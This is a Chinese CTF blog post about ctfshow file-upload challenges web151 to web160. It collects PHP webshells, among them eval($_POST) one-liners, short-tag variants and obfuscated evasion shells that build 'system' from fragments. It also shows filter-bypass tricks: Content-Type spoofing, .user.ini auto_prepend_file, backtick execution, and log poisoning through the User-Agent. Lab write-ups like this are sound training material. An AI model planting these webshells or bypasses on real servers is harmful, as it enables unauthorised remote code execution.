

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>ctfshow_file_upload - Sc0fie1d</title><meta name="Description" content="sofield&#39;s blog"><meta property="og:title" content="ctfshow_file_upload" />
<meta property="og:description" content="ctfshow文件上传专题" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://scofield1920.github.io/ctfshow_file_upload/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
<meta property="article:modified_time" content="2023-11-17T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>

<meta name="twitter:title" content="ctfshow_file_upload"/>
<meta name="twitter:description" content="ctfshow文件上传专题"/>
<meta name="application-name" content="scofield-blog">
<meta name="apple-mobile-web-app-title" content="scofield-blog">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/ctfshow_file_upload/" /><link rel="prev" href="http://scofield1920.github.io/ctfshow_rce/" /><link rel="next" href="http://scofield1920.github.io/ctfshow_file_include/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "ctfshow_file_upload",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/scofield1920.github.io\/ctfshow_file_upload\/"
        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, web","wordcount":  1126 ,
        "url": "http:\/\/scofield1920.github.io\/ctfshow_file_upload\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-11-17T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
                    "width":  528 ,
                    "height":  560 
                }},"author": {
                "@type": "Person",
                "name": "Sc0fie1d"
            },"description": ""
    }
    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Sc0fie1d"><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="black">Black</option>
                        <option value="auto">Auto</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Sc0fie1d"><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                    <option value="light">Light</option>
                    <option value="dark">Dark</option>
                    <option value="black">Black</option>
                    <option value="auto">Auto</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#总结">总结：</a></li>
    <li><a href="#靶场题目">靶场题目：</a>
      <ul>
        <li><a href="#web151">[web151]</a></li>
        <li><a href="#web152">[web152]</a></li>
        <li><a href="#web153">[web153]</a></li>
        <li><a href="#web154">[web154]</a></li>
        <li><a href="#web156">[web156]</a></li>
        <li><a href="#web157">[web157]</a></li>
        <li><a href="#web160">[web160]</a></li>
        <li><a href="#web161">[web161]</a></li>
        <li><a href="#web162">[web162]</a></li>
        <li><a href="#web164">[web164]</a></li>
        <li><a href="#web165">[web165]</a></li>
        <li><a href="#web166">[web166]</a></li>
        <li><a href="#web167">[web167]</a></li>
        <li><a href="#web168">[web168]</a></li>
        <li><a href="#web169">[web169]</a></li>
        <li><a href="#web170">[web170]</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ctfshow_file_upload</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1126 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#总结">总结：</a></li>
    <li><a href="#靶场题目">靶场题目：</a>
      <ul>
        <li><a href="#web151">[web151]</a></li>
        <li><a href="#web152">[web152]</a></li>
        <li><a href="#web153">[web153]</a></li>
        <li><a href="#web154">[web154]</a></li>
        <li><a href="#web156">[web156]</a></li>
        <li><a href="#web157">[web157]</a></li>
        <li><a href="#web160">[web160]</a></li>
        <li><a href="#web161">[web161]</a></li>
        <li><a href="#web162">[web162]</a></li>
        <li><a href="#web164">[web164]</a></li>
        <li><a href="#web165">[web165]</a></li>
        <li><a href="#web166">[web166]</a></li>
        <li><a href="#web167">[web167]</a></li>
        <li><a href="#web168">[web168]</a></li>
        <li><a href="#web169">[web169]</a></li>
        <li><a href="#web170">[web170]</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>ctfshow文件上传专题</p>
<h2 id="总结" class="headerLink">
    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结：</h2><p><a href="https://www.ngui.cc/el/3197856.html?action=onClick" target="_blank" rel="noopener noreferrer">CTF中文件上传及文件包含总结</a></p>
<p><a href="http://cn-sec.com/archives/1116089.html" target="_blank" rel="noopener noreferrer">CTF文件上传漏洞总结</a></p>
<p>文件上传马儿总结：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">短标签马儿：</span>
</span></span><span class="line"><span class="cl">	<span class="nx">一般的马儿：</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="nx">（</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">	没有PHP的马儿
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;? eval（$_POST[&#39;cmd&#39;]);?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;% eval（$_POST[&#39;cmd&#39;]);%&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">	有PHP的马儿
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;script language=&#34;php&#34;&gt;&lt;/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">特殊马儿：
</span></span></span><span class="line"><span class="cl"><span class="err">	过滤[]：用{}代替
</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">直接拿flag的变形马儿
</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;? echo `tac /var/www/html/f*`;?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;? echo `tac /var/www/html/f*`?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">	
</span></span></span><span class="line"><span class="cl"><span class="err">免杀马儿：
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">$a = &#34;s#y#s#t#e#m&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">$b = explode(&#34;#&#34;,$a);
</span></span></span><span class="line"><span class="cl"><span class="err">$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
</span></span></span><span class="line"><span class="cl"><span class="err">$c($_REQUEST[1]);
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">$a($_REQUEST[1]);
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">$a($_REQUEST[1]);
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;
</span></span></span><span class="line"><span class="cl"><span class="err">$a($_REQUEST[1]);
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="靶场题目" class="headerLink">
    <a href="#%e9%9d%b6%e5%9c%ba%e9%a2%98%e7%9b%ae" class="header-mark"></a>靶场题目：</h2><h3 id="web151" class="headerLink">
    <a href="#web151" class="header-mark"></a>[web151]</h3><p>前端校验文件类型，上传png图片马</p>
<p>再通过bp抓包修改文件后缀，蚁剑连接</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png" title="image-20230725170506084" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png 2x"
            sizes="auto"
            alt="image-20230725170506084">
    </a></figure></p>
<p>修改后缀为php</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170630382.png" title="image-20230725170630382" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170630382.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170630382.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170630382.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170630382.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170630382.png 2x"
            sizes="auto"
            alt="image-20230725170630382">
    </a></figure></p>
<p>蚁剑连接读flag</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170711639.png" title="image-20230725170711639" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170711639.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170711639.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170711639.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170711639.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170711639.png 2x"
            sizes="auto"
            alt="image-20230725170711639">
    </a></figure></p>
<h3 id="web152" class="headerLink">
    <a href="#web152" class="header-mark"></a>[web152]</h3><p>后端验证实际上是验证Content-Type</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png" title="image-20230725172718121" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png 2x"
            sizes="auto"
            alt="image-20230725172718121">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172654596.png" title="image-20230725172654596" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172654596.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172654596.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172654596.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172654596.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172654596.png 2x"
            sizes="auto"
            alt="image-20230725172654596">
    </a></figure></p>
<h3 id="web153" class="headerLink">
    <a href="#web153" class="header-mark"></a>[web153]</h3><p><strong>.user.ini</strong></p>
<p>原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</p>
<p><strong>注：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auto_append_file在木马文件上传后上传  auto_prepend_file在木马文件上传前上传
</span></span></code></pre></td></tr></table>
</div>
</div><p>这道题按照前面两种方法无法上传</p>
<p>后面加了png头文件，php大写可以上传，但是蚁剑无法连接，用php3也不行</p>
<p>url上输入 /upload/</p>
<p>显示了nothing here表示可以用配置文件（因为upload目录下有php文件）</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103310890.png" title="image-20230726103310890" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103310890.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103310890.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103310890.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103310890.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103310890.png 2x"
            sizes="auto"
            alt="image-20230726103310890">
    </a></figure></p>
<p>以这样的方式上传，再改包，不然上传不了</p>
<p>然后直接上传写了一句话木马的png</p>
<p>上传成功后用蚁剑连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">1</span><span class="n">db86d8a</span><span class="o">-</span><span class="n">c57c</span><span class="o">-</span><span class="mi">4</span><span class="n">b7f</span><span class="o">-</span><span class="n">b60c</span><span class="o">-</span><span class="mi">2</span><span class="n">efd317295cc</span><span class="o">.</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103638336.png" title="image-20230726103638336" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103638336.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103638336.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103638336.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103638336.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103638336.png 2x"
            sizes="auto"
            alt="image-20230726103638336">
    </a></figure></p>
<p>当然当我们再次访问/upload时：</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103906855.png" title="image-20230726103906855" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103906855.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103906855.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103906855.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103906855.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726103906855.png 2x"
            sizes="auto"
            alt="image-20230726103906855">
    </a></figure></p>
<h3 id="web154" class="headerLink">
    <a href="#web154" class="header-mark"></a>[web154]</h3><p>上题思路可解</p>
<p>如果带木马的不行，然后就更换短标签一个个试</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?=</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>web155(内容过滤php)同上</p>
<h3 id="web156" class="headerLink">
    <a href="#web156" class="header-mark"></a>[web156]</h3><p>过滤了文件内的<code>[]</code>,可以改成<code>{}</code>来绕过</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png" title="image-20230726114212624" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png 2x"
            sizes="auto"
            alt="image-20230726114212624">
    </a></figure></p>
<h3 id="web157" class="headerLink">
    <a href="#web157" class="header-mark"></a>[web157]</h3><p>经测试，对文件内容过滤了 <code>php</code>、<code>[</code>、<code>{</code>、 <code>;</code></p>
<p>上传<code>.user.ini</code></p>
<p>php 最后的语句也可以不加分号的，前提是得有 <code>?&gt;</code>结束标志。</p>
<p>修改图片马的内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=system(&#39;ls ../&#39;)?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过ls查看flag文件的位置，写入之后访问<code>/upload/index.php</code>查看回显</p>
<p>使用cat或tac读取信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=system(&#39;cat ../*&#39;)?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726150235091.png" title="image-20230726150235091" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726150235091.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726150235091.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726150235091.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726150235091.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726150235091.png 2x"
            sizes="auto"
            alt="image-20230726150235091">
    </a></figure></p>
<p>web158思路同上</p>
<p>web159过滤了括号<code>()</code>,我们可以用反引号来代替<code>system()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=`cat ../*`?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web160" class="headerLink">
    <a href="#web160" class="header-mark"></a>[web160]</h3><p>过滤了反引号，我们可以包含日志</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="o">=</span><span class="n">include</span><span class="s2">&#34;/var/lo&#34;</span><span class="o">.</span><span class="s2">&#34;g/nginx/access.lo&#34;</span><span class="o">.</span><span class="s2">&#34;g&#34;</span><span class="err">?</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>但发现 <code>log</code>也被过滤了，可以使用<code>&quot;&quot;</code>来拼接</p>
<p>尝试一句话木马UA头：<code>&lt;?php eval($_POST[x]);?&gt;</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726151942012.png" title="image-20230726151942012" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726151942012.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726151942012.png"
